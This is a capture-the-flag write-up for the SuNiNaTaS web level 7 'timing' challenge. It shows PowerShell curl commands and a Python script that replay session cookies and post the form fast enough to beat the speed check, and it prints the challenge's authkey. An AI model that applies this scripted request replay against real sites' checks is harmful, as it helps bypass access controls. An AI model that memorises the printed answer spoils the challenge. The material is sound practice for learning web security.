# Level 7   Timing Attack

Challenge: [http://suninatas.com/challenge/web07/web07.asp](http://suninatas.com/challenge/web07/web07.asp)

![level-7.png](/assets/ctf/suninatas/web/level-7.png)

In the middle of the page there's `YES` button, but if we click it we get prompt that we are too slow..
```html
    <form method="post" action="./web07_1.asp" name="frm">
        <div align="center">
            <input type="button" name="main_btn" value="main" style="width: 60" onclick="location.href = '/'">&nbsp&nbsp&nbsp
            <input type="button" name="main_btn" value="Back" style="width: 60" onclick="history.back()">
        </div>
        <div align="center">
            <input type="hidden" name="web07" value="Do U Like girls?">
        </div>
        <div align="center">
            <img src="./iu.gif" width="700" height="1000" name="iu">
        </div>
        <br>
        ...
        <br>
        <div align="center">
            <input type="submit" value="YES">
        </div>
        <br>
        ...
        <br>
        <div align="center">
            <img src="./yoona.gif" alt="yoona" width="700" height="1000">
        </div>
    </form>
</body>

<!-- Hint : Faster and Faster -->
<!-- M@de by 2theT0P -->
```

[view-source:suninatas.com/challenge/web07/web07_1.asp](view-source:suninatas.com/challenge/web07/web07_1.asp)

```html
<script language="javascript">
    alert("Wrong way!");
    document.location.href = './web07.asp';
</script>

<script language="javascript">
    alert("Fail..Your too slow");
    location.href = "web07.asp";
</script>
```

```powershell
$cookies = 'Cookie: ASP.NET_SessionId=vzkiael0a3cgvh0001zezdjd; ASPSESSIONIDACDRTBCD=HAFLCJJBPCIJNEGKOKPHBBIL;';
curl 'http://suninatas.com/challenge/web07/web07.asp' -H $cookies -is | select -First 10
curl 'http://suninatas.com/challenge/web07/web07_1.asp' -H $cookies -d 'web07=Do+U+Like+girls%3F' -i
```

> Note: Commands are in powershell

Execute quickly so just paste and spam enter, lol
```powershell
➜ $cookies = 'Cookie: ASP.NET_SessionId=vzkiael0a3cgvh0001zezdjd; ASPSESSIONIDACDRTBCD=HAFLCJJBPCIJNEGKOKPHBBIL;';
➜ curl 'http://suninatas.com/challenge/web07/web07.asp' -H $cookies -is | select -First 10
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sat, 19 Oct 2024 09:36:04 GMT
Content-Length: 3638


<!DOCTYPE html>
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sat, 19 Oct 2024 09:36:05 GMT
Content-Length: 94


<script language="javascript">
    alert("Congratulation!");
</script>
Authkey : G0Od d@y
```

More mature approach would be something like:
```python
from requests import Session

URL = 'http://suninatas.com/challenge/web07'

with Session() as session:
    session.cookies.set('ASP.NET_SessionId', 'vzkiael0a3cgvh0001zezdjd')
    session.cookies.set('ASPSESSIONIDACDRTBCD', 'HAFLCJJBPCIJNEGKOKPHBBIL')

    session.get(f'{URL}/web07.asp')

    resp = session.post(f'{URL}/web07_1.asp', data={'web07': 'Do U Like girls?'})
    print(resp.text)

'''
<script language="javascript">
    alert("Congratulation!");
</script>
Authkey : G0Od d@y
'''
```

> Authkey: `G0Od d@y`

